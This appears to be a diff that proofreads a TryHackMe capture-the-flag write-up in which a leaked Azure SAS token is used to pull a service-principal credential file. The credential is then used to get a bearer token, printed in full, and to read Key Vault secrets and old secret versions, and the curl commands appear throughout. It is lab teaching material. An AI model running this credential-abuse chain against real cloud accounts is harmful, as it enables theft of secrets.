@@ -1,12 +1,12 @@
-# CryptoCabana (https://tryhackme.com/room/hh-cryptocabana-f81cac95)
+# [CryptoCabana](https://tryhackme.com/room/hh-cryptocabana-f81cac95)
 
 - Day 9 of Hacker Holidays 2026
-- This is a cloud based challenges , we have a Azure Storage static website url.
-- On visiting the url , we can see a form that backups the entered revoery phrase . 
+- This is a cloud based challenges, we have an Azure Storage static website URL.
+- On visiting the URL, we can see a form that backs up the entered recovery phrase. 
 
 ![screenshot](../data/cb1.png)
 
-- lets inspect the developer tools, Network tab revealed a page called app.js .
+- Let's inspect the developer tools; the Network tab revealed a page called app.js.
 
 ![screenshot](../data/cb2.png)
 
@@ -43,13 +43,13 @@ function backupPhrase() {
     });
 }
 ```
-- most interesting part is that the storage account name and SAS token are embedded directly in the JavaScript.
-- const STORAGE_ACCOUNT = "cryptocabanaf5scjagc" This specifies the Azure Storage Account where the data will be stored.
+- The most interesting part is that the storage account name and SAS token are embedded directly in the JavaScript.
+- const STORAGE_ACCOUNT = "cryptocabanaf5scjagc"; This specifies the Azure Storage Account where the data will be stored.
 - const BACKUPS_CONTAINER = "backups" 
 - **SAS Token** const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&..." This is a Shared Access Signature (SAS). A SAS token grants limited permissions to Azure Storage without exposing the storage account's master key.
 
-- Using the exposed token we can investigate the storage service endpoint.
-- **let's Breakdown the SAS token** 
+- Using the exposed token, we can investigate the storage service endpoint.
+- **Let's break down the SAS token** 
 
 ```
 ?sv=2022-11-02
@@ -198,7 +198,7 @@ This is the cryptographic signature.
 </EnumerationResults>
 ```
 - The storage account contains three containers: **$web (Azure Static Website container), backups, and vault.**
-- The vault was looks a bit odd right!. lets see what it got. 
+- The vault looks a bit odd right!. Let's see what it has. 
 - List the blobs inside the vault container
 ```
 curl "https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container&comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D" | xmllint --format -
@@ -262,7 +262,7 @@ curl "https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container
 </EnumerationResults>
 ```
 
-- Lets see what we got in here.
+- Let's see what we got in here.
 ```
 curl "https://cryptocabanaf5scjagc.blob.core.windows.net/vault/backup-service-account.json?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
 ```
@@ -272,9 +272,9 @@ curl "https://cryptocabanaf5scjagc.blob.core.windows.net/vault/backup-service-ac
 ```
 - This JSON contains Azure application credentials (also called a service principal) that allow software to authenticate to Azure without a human logging in.
 
-- **Authunticate to Azure using the above creds**
--  the standard way for an application to authenticate is using the OAuth 2.0 Client Credentials Grant.
-- then we can make authenticated requests to the Key Vault REST API.
+- ** Authenticate to Azure using the above creds**
+-  The standard way for an application to authenticate is using the OAuth 2.0 Client Credentials Grant.
+- Then we can make authenticated requests to the Key Vault REST API.
 ```
  curl -X POST \
   "https://login.microsoftonline.com/8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c/oauth2/v2.0/token" \
@@ -288,11 +288,11 @@ curl "https://cryptocabanaf5scjagc.blob.core.windows.net/vault/backup-service-ac
 ```
 {"token_type":"Bearer","expires_in":3599,"ext_expires_in":3599,"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6ImZFdHFyaEtUMWJYQUdhZlNkUW9OMXZYVFJwSSIsImtpZCI6ImZFdHFyaEtUMWJYQUdhZlNkUW9OMXZYVFJwSSJ9.eyJhdWQiOiJjZmE4YjMzOS04MmEyLTQ3MWEtYTNjOS0wZmMwYmU3YTQwOTMiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC84ZjhjNWY4ZS00MmQzLTRjZWItOTdhZC0yNDFiYmY0NDZkNmMvIiwiaWF0IjoxNzg2MDE4OTQ0LCJuYmYiOjE3ODYwMTg5NDQsImV4cCI6MTc4NjAyMjg0NCwiYWlvIjoiazJGZ1lEalZIOWFSVS95alhlbGphWEx0WVc1VkFlTkxWWjR2WXdYWlpTMW43ajd4bmg4QSIsImFwcGlkIjoiZGJjZjI5MjMtZTRlYi00YjcyLWEwYTQtNjg4YWExMTg1Y2Y1IiwiYXBwaWRhY3IiOiIxIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOGY4YzVmOGUtNDJkMy00Y2ViLTk3YWQtMjQxYmJmNDQ2ZDZjLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiODUyZDE4YmQtZjk1MS00ZjhhLWEwZWQtY2UzNzg4NjA5MjQ1IiwicmgiOiIxLkFXRUJqbC1NajlOQzYweVhyU1FidjBSdGJEbXpxTS1pZ2hwSG84a1B3TDU2UUpNQUFBQmhBUS4iLCJzdWIiOiI4NTJkMThiZC1mOTUxLTRmOGEtYTBlZC1jZTM3ODg2MDkyNDUiLCJ0aWQiOiI4ZjhjNWY4ZS00MmQzLTRjZWItOTdhZC0yNDFiYmY0NDZkNmMiLCJ1dGkiOiJOTWduVkdxbjNVeVJuRUx0NzNVRUFRIiwidmVyIjoiMS4wIiwieG1zX2FjdF9mY3QiOiIzIDkiLCJ4bXNfZnRkIjoiNUg4cVlGLVVaRFByYUdQMVh0S1o0SDVzS3BkVW4yTERGOFlEaHlPS0o4b0JkWE51YjNKMGFDMWtjMjF6IiwieG1zX2lkcmVsIjoiNyA2IiwieG1zX3JkIjoiMC40MkxqWUJKaWVzZ2tKTUxCS1NTdzR4MW43eVBERlBjWjl4MU90dlp5SEJBUzRlQVdFdGh3WHJMNDJWM3pkQnVXcDNIWm1fdmJBQSIsInhtc19zdWJfZmN0IjoiMyA5In0.CiZFBjnK10UhyeMFeadkaJa4G38O6zl8reBYXtxfVNGoEIQ6Zo03cSiYjKFKWVP3W98oXpm0R_B7U1QrkgnIhO1QQFvMnRSF03AnhUtej8a-kFMbDdwKgVZE2Q8wbYiWeQNo7rsepRdwcTCf0ROvgzKXkOYOytC_lunVV9u2E1w1OJ3HAt6oPT7MreXwvdjYiU_gXKfZ0H1shqtmVqH2mh0rtNP4wGVbC5d08wlN6bP19QMUCy974Ke0bYP2nssRC80a-9SwbAgqEa1I_VKbTkfFt5j9oCY-O8A3oaZ4NSL5SRJ-aqxdIoJYp53yOGTgVgyK8V62ijT-yVGnW6L7dA"}
 ```
-- copy the token value. and save it to a variable 
+- Copy the token value. and save it to a variable 
 ```
 TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6ImZFdHFyaEtUMWJYQUdhZlNkUW9OMXZYVFJwSSIsImtpZCI6ImZFdHFyaEtUMWJYQUdhZlNkUW9OMXZYVFJwSSJ9.eyJhdWQiOiJjZmE4YjMzOS04MmEyLTQ3MWEtYTNjOS0wZmMwYmU3YTQwOTMiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC84ZjhjNWY4ZS00MmQzLTRjZWItOTdhZC0yNDFiYmY0NDZkNmMvIiwiaWF0IjoxNzg2MDE4OTQ0LCJuYmYiOjE3ODYwMTg5NDQsImV4cCI6MTc4NjAyMjg0NCwiYWlvIjoiazJGZ1lEalZIOWFSVS95alhlbGphWEx0WVc1VkFlTkxWWjR2WXdYWlpTMW43ajd4bmg4QSIsImFwcGlkIjoiZGJjZjI5MjMtZTRlYi00YjcyLWEwYTQtNjg4YWExMTg1Y2Y1IiwiYXBwaWRhY3IiOiIxIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOGY4YzVmOGUtNDJkMy00Y2ViLTk3YWQtMjQxYmJmNDQ2ZDZjLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiODUyZDE4YmQtZjk1MS00ZjhhLWEwZWQtY2UzNzg4NjA5MjQ1IiwicmgiOiIxLkFXRUJqbC1NajlOQzYweVhyU1FidjBSdGJEbXpxTS1pZ2hwSG84a1B3TDU2UUpNQUFBQmhBUS4iLCJzdWIiOiI4NTJkMThiZC1mOTUxLTRmOGEtYTBlZC1jZTM3ODg2MDkyNDUiLCJ0aWQiOiI4ZjhjNWY4ZS00MmQzLTRjZWItOTdhZC0yNDFiYmY0NDZkNmMiLCJ1dGkiOiJOTWduVkdxbjNVeVJuRUx0NzNVRUFRIiwidmVyIjoiMS4wIiwieG1zX2FjdF9mY3QiOiIzIDkiLCJ4bXNfZnRkIjoiNUg4cVlGLVVaRFByYUdQMVh0S1o0SDVzS3BkVW4yTERGOFlEaHlPS0o4b0JkWE51YjNKMGFDMWtjMjF6IiwieG1zX2lkcmVsIjoiNyA2IiwieG1zX3JkIjoiMC40MkxqWUJKaWVzZ2tKTUxCS1NTdzR4MW43eVBERlBjWjl4MU90dlp5SEJBUzRlQVdFdGh3WHJMNDJWM3pkQnVXcDNIWm1fdmJBQSIsInhtc19zdWJfZmN0IjoiMyA5In0.CiZFBjnK10UhyeMFeadkaJa4G38O6zl8reBYXtxfVNGoEIQ6Zo03cSiYjKFKWVP3W98oXpm0R_B7U1QrkgnIhO1QQFvMnRSF03AnhUtej8a-kFMbDdwKgVZE2Q8wbYiWeQNo7rsepRdwcTCf0ROvgzKXkOYOytC_lunVV9u2E1w1OJ3HAt6oPT7MreXwvdjYiU_gXKfZ0H1shqtmVqH2mh0rtNP4wGVbC5d08wlN6bP19QMUCy974Ke0bYP2nssRC80a-9SwbAgqEa1I_VKbTkfFt5j9oCY-O8A3oaZ4NSL5SRJ-aqxdIoJYp53yOGTgVgyK8V62ijT-yVGnW6L7dA"
 ```
-- Now we can enumerate the Azure Key Vault using the obtained access token..
+- Now we can enumerate the Azure Key Vault using the obtained access token.
 ```
 curl \
   -H "Authorization: Bearer $TOKEN" \
@@ -357,7 +357,7 @@ curl \
 }
 ```
 
-- We discover four secret entries in the Key Vault., lets see what the info they contains.
+- We discover four secret entries in the Key Vault. Let's see what info they contain.
 ```
  curl \
   -H "Authorization: Bearer $TOKEN" \
@@ -403,7 +403,7 @@ curl \
 }
 ```
 
-- The key-shard 1 and 3 have parts of flags , but the 2nd key says a massage
+- The key-shard 1 and 3 have parts of flags, but the 2nd key says a message
 ```
 curl \
   -H "Authorization: Bearer $TOKEN" \
@@ -429,7 +429,7 @@ curl \
 ```
 - The response contains the current version of the secret. Since the message says the previous value is recoverable, Azure Key Vault secret versioning becomes the next logical place to investigate.
 - Azure Key Vault keeps multiple versions of a secret when it is updated (rotated), unless old versions have been deleted.
-- If you visit **/versions** endpoints we can see the avialable versions.
+- If you visit the **/versions** endpoints, you can see the available versions.
 
 ```
  curl \
@@ -471,7 +471,7 @@ curl \
   "nextLink": null
 }
 ```
-- See the two version let see the other version we didnt see before .
+- See the two version let see the other version we didn't see before.
 ```
 curl \
   -H "Authorization: Bearer $TOKEN" \
@@ -495,6 +495,6 @@ curl \
   }
 }
 ```
-- Whoop! we got the other part.
+- Whoop! We got the remaining part of the flag.
 
 **FLAG: THM{n0t_ur_k3ys_n0t_ur_c01ns!}**
